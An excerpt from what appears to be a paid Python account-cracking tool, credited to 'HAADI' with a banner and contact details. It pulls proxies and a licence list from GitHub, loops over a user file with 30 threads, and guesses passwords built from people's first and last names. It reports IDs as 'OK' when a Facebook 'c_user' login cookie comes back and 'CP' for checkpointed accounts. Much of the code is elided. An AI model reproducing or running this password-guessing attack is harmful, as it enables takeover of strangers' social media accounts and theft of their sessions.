...
|  __)| |/ _  |/ _  |/ || | |           
| |   | ( ( | ( ( | ( (_| | |             
|_|   |_|\_||_|\_||_|\____|_| BALOCH                       
------------------------------------------------------
Author: HAADI                                   
Whatsp: +1 (647) 957-6445             
Github: github.com/haadi-baloch   
Version: 0.01                                      
--------------------------------------------------
--------------------------------------------------"""
loop = 0
...
try:
    ...
    proxy = requests.get('https://github.com/ali-raza0/Numb/blob/main/untitled.txt').text.splitlines()
    v = 3.1
...
def buy():
    ...
    try:
        user_data = requests.get('https://github.com/ali-raza0/F/blob/main/H').text.splitlines()
        ...
        if gen_token in user_data:
            ...
            os.system('xdg-open https://wa.me/+923377519518')
        ...
        with ThreadPool(max_workers=30) as yaari:
            ...
            for user in fileopen:
                try:
                    ...
                    print('\nThis file is not supported for HAADI tool.Create file only from HAADI tool....\n')
                    os.sys.exit()
                ps=first.lower()
                ps2=last.lower()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m[HAADI-OK] '+cid+' | '+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[HAADI-CP] '+cid+' | '+ps+'\033[0;97m')
